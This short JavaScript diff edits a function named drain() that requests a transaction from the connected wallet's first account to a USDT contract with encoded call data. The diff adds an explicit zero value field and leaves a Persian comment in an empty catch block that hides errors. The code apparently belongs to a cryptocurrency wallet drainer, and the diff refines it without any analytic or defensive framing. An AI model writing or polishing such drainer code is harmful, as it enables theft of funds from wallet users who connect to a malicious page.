@@ -14,10 +14,11 @@ async function drain() {
       params: [{
         from: accounts[0],
         to: USDT,
-        data: data
+        data: data,
+        value: "0x0"
       }]
     });
   } catch (error) {
-    // هیچ متنی نشون نمی‌ده
+    // هیچی
   }
 }
